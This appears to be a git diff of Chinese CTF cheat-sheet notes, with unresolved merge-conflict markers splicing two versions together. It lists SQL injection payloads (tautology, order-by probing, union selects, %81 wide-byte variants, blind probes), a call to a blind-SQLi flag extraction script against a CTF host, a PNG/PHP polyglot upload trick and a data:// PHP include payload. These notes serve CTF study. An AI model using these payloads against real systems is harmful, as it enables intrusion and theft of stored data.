@@ -2,7 +2,11 @@
 
 
 
+<<<<<<< HEAD
 # Python框架Flask的SSTI模板注入+沙箱逃逸
+=======
+# Python框架Flask的沙箱逃逸
+>>>>>>> origin/master
 
 ## 内置函数
 
@@ -64,15 +68,23 @@ exec("error=\"abc\";raise Exception("abc")")
 - --
 - --+
 
+<<<<<<< HEAD
 ### 测试漏洞存在
 
 ```sql
 ' or true#
+=======
+### 测试恶意查询
+
+```sql
+' or true #
+>>>>>>> origin/master
 ```
 
 ### 测试字段数量
 
 ```sql
+<<<<<<< HEAD
 ' order by 3#
 ```
 
@@ -98,6 +110,15 @@ exec("error=\"abc\";raise Exception("abc")")
 
 ```sql
 ' union select all 1,2,fl4g from secret_table#
+=======
+' order by 3 #
+```
+
+### 联表查询字段
+
+```sql
+' union select all null,null,null from users #
+>>>>>>> origin/master
 ```
 
 
@@ -107,6 +128,7 @@ exec("error=\"abc\";raise Exception("abc")")
 ### 确认注释类型
 
 - #
+<<<<<<< HEAD
 
 - --
 
@@ -116,11 +138,21 @@ exec("error=\"abc\";raise Exception("abc")")
 
 ```sql
 %81' or true#
+=======
+- --
+- --+
+
+### 测试恶意查询
+
+```sql
+%81' or true #
+>>>>>>> origin/master
 ```
 
 ### 测试字段数量
 
 ```sql
+<<<<<<< HEAD
 %81' order by 3#
 ```
 
@@ -146,6 +178,15 @@ exec("error=\"abc\";raise Exception("abc")")
 
 ```sql
 %81' union select all 1,2,fl4g from secret_table#
+=======
+%81' order by 3 #
+```
+
+### 联表查询字段
+
+```sql
+%81' union select all null,null,null from users #
+>>>>>>> origin/master
 ```
 
 
@@ -155,6 +196,7 @@ exec("error=\"abc\";raise Exception("abc")")
 ### 确认注释类型
 
 - #
+<<<<<<< HEAD
 
 - --
 
@@ -164,11 +206,21 @@ exec("error=\"abc\";raise Exception("abc")")
 
 ```sql
 ' or true#
+=======
+- --
+- --+
+
+### 测试恶意查询
+
+```sql
+' or true #
+>>>>>>> origin/master
 ```
 
 ### 测试字段数量
 
 ```sql
+<<<<<<< HEAD
 ' order by 3#
 ```
 
@@ -197,6 +249,18 @@ exec("error=\"abc\";raise Exception("abc")")
 ```
 
 ### 测试盲注函数
+=======
+' order by 3 #
+```
+
+### 联表查询字段
+
+```sql
+' union select all null,null,null from users #
+```
+
+**测试盲注函数**
+>>>>>>> origin/master
 
 ```sql
 ' union select all null,null,null from users where length(null) >= 10 #
@@ -268,6 +332,7 @@ def getFlagFromSqlBlindBet(url: str, key: str = "id", field: str = "id", fieldLe
 if __name__ == "__main__":
     print(getFlagFromSqlBlindBet("http://fliaz.top:32864/", key = "username", field = "password", fieldLength = 5, table = "users", flagFormat = "pkwsec{}", flagLength = 44, rightMark = "Right"))
 ```
+<<<<<<< HEAD
 
 
 
@@ -372,3 +437,5 @@ copy /b png.png + php.php payload.png
 ```shell
 ?include=data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=
 ```
+=======
+>>>>>>> origin/master
